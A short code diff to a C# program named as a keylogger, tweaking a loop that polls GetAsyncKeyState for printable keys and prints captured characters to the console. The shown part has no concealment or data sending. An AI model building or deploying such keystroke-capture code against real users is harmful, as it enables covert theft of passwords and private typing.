@@ -20,20 +20,16 @@ namespace WindowsLogger.KeyLogger
 		{
 			while (true)
 			{
-				Thread.Sleep(10);
-
-
+				Thread.Sleep(15);
 				for (int i = 32; i < 127; i++)
 				{
 					int keyState = GetAsyncKeyState(i);
-					if (keyState == 32768)
+					if (keyState == 32769)
 					{
-						Console.Write((char) i + ", ");
+						Console.Write((char) i);
 					} 
 				}
 			}
 		}
-
-
 	}
 }
